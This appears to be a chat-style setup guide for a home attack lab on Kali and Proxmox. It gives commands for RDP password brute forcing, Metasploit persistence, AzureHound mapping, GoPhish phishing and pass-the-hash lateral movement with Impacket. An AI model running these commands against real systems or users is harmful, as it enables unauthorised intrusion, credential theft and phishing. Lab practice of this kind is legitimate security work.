1. RDP Brute Force  
2. Metasploit Persistence  
3. AzureHound  
4. Phishing/Spam via GoPhish
5. Lateral Movement
---
### 1. RDP Brute Force

**Tools needed:** `hydra`, `crowbar`, or `netexec`

bash

```bash
sudo apt install -y hydra netexec
```

NetExec (nxc) is the modern replacement for CrackMapExec and is the best choice for RDP brute force:

bash

```bash
nxc rdp <target-ip> -u users.txt -p passwords.txt
```

You'll also want a wordlist — Kali ships with `rockyou`:

bash

```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

### 2. Metasploit Persistence

**Good news:** Metasploit is pre-installed on Kali. Just make sure it's up to date and the database is initialized:

bash

```bash
sudo apt update && sudo apt install -y metasploit-framework
sudo msfdb init
msfconsole
```

For persistence specifically, you'll use modules like `post/windows/manage/persistence` or `exploit/multi/handler` to catch callbacks. Make sure your Kali IP is reachable from the target (check your Proxmox bridge/network from the previous setup).

---

### 3. AzureHound

AzureHound collects Azure AD/Entra ID data and feeds it into BloodHound. You need both:

bash

```bash
# Install BloodHound + Neo4j
sudo apt install -y bloodhound neo4j

# Download AzureHound binary
wget https://github.com/BloodHoundAD/AzureHound/releases/latest/download/azurehound-linux-amd64.zip
unzip azurehound-linux-amd64.zip
chmod +x azurehound
```

Start the BloodHound stack:

bash

```bash
sudo neo4j start
bloodhound &   # default creds: neo4j / neo4j (change on first login)
```

Run AzureHound against your tenant:

bash

```bash
./azurehound -u <user@tenant.com> -p '<password>' list --tenant <tenant-id> -o output.json
```

Then drag the JSON into the BloodHound GUI to map attack paths.

---

### 4. Phishing/Spam via GoPhish

GoPhish isn't in apt — install it manually:

bash

```bash
wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish
sudo ./gophish
```

Access the admin panel at `https://127.0.0.1:3333` (default creds are printed in the terminal on first run). You'll need to configure a **sending profile** (SMTP server) and a **landing page**. For a lab, you can point at a local SMTP relay or use a test mail server like `mailhog`:

bash

```bash
sudo apt install -y golang-go
# or just use Docker if you have it
```

---

### 5. Lateral Movement

This relies on **Impacket** and **NetExec** — the core toolkit:

bash

```bash
sudo apt install -y impacket-scripts netexec
```

Key tools you'll use:

|Tool|Purpose|
|---|---|
|`nxc smb`|SMB enumeration & pass-the-hash|
|`psexec.py`|Remote execution via SMB|
|`wmiexec.py`|WMI-based lateral movement|
|`secretsdump.py`|Credential dumping (SAM, LSA, NTDS)|
|`smbclient.py`|SMB share browsing|

Example lateral move after getting a hash:

bash

```bash
nxc smb <subnet>/24 -u Administrator -H <NTLM-hash> --local-auth
psexec.py -hashes :<NTLM-hash> Administrator@<target-ip>
```
